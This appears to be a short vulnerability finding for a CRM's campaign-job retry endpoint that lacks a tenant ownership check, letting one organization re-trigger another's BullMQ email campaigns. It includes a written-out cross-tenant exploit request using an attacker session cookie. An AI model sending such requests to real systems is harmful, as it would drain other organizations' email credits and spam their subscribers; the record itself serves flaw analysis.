diagnosis: An endpoint triggers a retry on a marketing email campaign job in BullMQ without verifying if job.data.tenantId matches req.user.tenantId. Attackers can re-trigger large email campaigns belonging to other organizations, consuming their SendGrid/SES credits and spamming their subscriber lists.
exploit_request:
POST /api/campaigns/jobs/job_camp_blast_99014/retry HTTP/1.1
Host: crm.outreach.io
Cookie: session_id=tenant_attacker
